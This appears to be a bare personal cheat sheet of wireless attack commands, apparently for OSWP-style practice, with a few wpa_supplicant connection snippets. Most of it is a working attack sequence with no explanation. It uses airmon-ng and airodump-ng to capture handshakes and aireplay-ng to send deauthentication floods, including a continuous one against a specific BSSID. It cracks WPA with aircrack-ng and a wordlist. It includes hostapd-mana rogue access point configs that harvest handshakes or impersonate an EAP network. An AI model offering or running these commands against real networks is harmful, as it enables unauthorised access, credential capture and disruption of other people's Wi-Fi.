https://null-byte.wonderhowto.com/how-to/hack-wi-fi-hunting-down-cracking-wep-networks-0183712/


ctrl_interface=/var/run/wpa_supplicant
ap_scan=1

network={
    ssid="Your_Network_Name"
    psk="Your_Network_Password"
    key_mgmt=WPA-PSK
}


sudo wpa_supplicant -B -c /path/to/wpa_supplicant.conf -i wlan0


sudo airmon-ng check kill

sudo airmon-ng start wlan0

sudo airodump-ng wlan0

sudo airodump-ng -c 1 -w wpa --essid OSWP --bssid 10:FE:ED:xx:xx:xx wlan0

sudo aireplay-ng -0 1 -a 10:FE:ED:D1:xx:xx -c 30:07:4D:57:xx:xx wlan0  // -c= client

sudo aircrack-ng -w hash wpa-01.cap

sudo aircrack-ng -w /usr/share/john/password.lst -e <ssid> -b <mac> wpa-01.cap

## connect ap via terminal


nano wpa_supplicant.conf
```
network={
  ssid="<ESSID>"
  psk="<PSK>"
  key_mgmt=WPA-PSK
}

```

## connect

```
$ sudo wpa_supplicant -B -i <wireless interface> -c wpa_supplicant.conf

```
for ip address from dhcp

```
$ sudo dhclient <wireless interface>
```



---------------------------------------------------


cat Mostar-mana.conf

```
interface=wlan0
ssid=Mostar
channel=1
hw_mode=g
ieee80211n=1
wpa=3
wpa_key_mgmt=WPA-PSK
wpa_passphrase=ANYPASSWORD
wpa_pairwise=TKIP
rsn_pairwise=TKIP CCMP
mana_wpaout=/home/kali/mostar.hccapx
```

```
# interface and driver settings
interface=wlan0
driver=nl80211

# wireless network settings
ssid=MANA-WPA2
channel=6

# authentication settings
auth_algs=3
wpa=2
wpa_key_mgmt=WPA-EAP
rsn_pairwise=CCMP

# EAP settings
eap_server=1
eap_user_file=/etc/hostapd-mana/eap_users
ca_cert=/etc/hostapd-mana/certs/ca.pem
server_cert=/etc/hostapd-mana/certs/server-cert.pem
private_key=/etc/hostapd-mana/certs/server-key.pem
dh_file=/etc/hostapd-mana/certs/dh
```

sudo hostapd-mana Mostar-mana.conf 

sudo aireplay-ng -0 0 -a FC:7A:2B:88:63:EF wlan1mon

aircrack-ng mostar.hccapx -e Mostar -w /usr/share/john/password.lst
